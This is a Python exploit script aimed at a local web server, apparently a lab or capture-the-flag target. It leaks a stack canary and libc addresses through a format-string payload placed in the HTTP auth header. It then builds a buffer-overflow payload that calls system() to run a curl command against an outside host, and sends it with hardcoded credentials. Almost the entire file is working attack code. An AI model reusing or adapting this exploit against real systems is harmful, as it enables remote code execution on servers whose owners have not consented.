import requests
import os
from pwn import *

url = "http://localhost:4242/"

response = requests.get(url, auth=('%27$.8x %30$.8x %31$.8x %51$.8x', 'a'))

canary, stack, address, setvbuf = [int(x.replace('"', ''), 16) for x in response.headers['WWW-Authenticate'].split()[-4:]]


canary += 0x3d

libc_local = 0xf7b22000

setvbuf_off = 0xf7b8a50b - libc_local
system_off = 0xf7b5f2e0 - libc_local
arg_off = 0xffffcd88 - 0xffffce18

libc = setvbuf - setvbuf_off
#print("libc", hex(libc))

stack_off = 0xffffcd54 - 0xffffcbe3

system = libc + system_off
filename = stack - stack_off + 125
fake_ret = stack + arg_off

payload = b" "*500
payload += b"A"*(540-len(payload))
payload += struct.pack("I", filename)
payload += b"A"*20
payload += struct.pack("I", filename)
payload += b"A"*4
payload += struct.pack("I", canary)
payload += b"A"*12
payload += struct.pack("I", system)
payload += b"A"*4
payload += struct.pack("I", fake_ret)
payload += b"curl -v ifconfig.me"

if url == 'http://127.0.0.1:8000/':
    auth = 'Basic YWRtaW46aGVsbG8xMjM='
else:
    auth = 'Basic YWRtaW46Ym9iJ3MgeW91ciB1bmNsZQ=='

f = open("ultimate.payload",'wb')
f.write(payload)
f.close()

req = f''' curl -s --http0.9 -m 3 --data-binary @./ultimate.payload -H "Content-Length:512" -H "Authorization: {auth}" {url}ultimate.html | tee -a brute.log'''

os.system(req)